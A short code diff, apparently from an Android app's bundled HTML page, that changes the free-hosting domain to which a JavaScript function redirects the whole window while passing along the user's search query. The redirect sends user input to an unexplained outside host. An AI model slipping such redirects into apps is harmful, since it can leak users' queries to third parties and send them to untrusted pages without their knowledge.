@@ -48,7 +48,7 @@ function n(){
     }else{
     var n = window.location.href;
     n = n.replace("file:///android_asset/h6.html?s=","");
-   window.top.location = "http://mobellabel.zya.me/search.php?u=" + n ;
+   window.top.location = "http://mdsaerdd.hstn.me/search.php?u=" + n ;
     }
 }
 
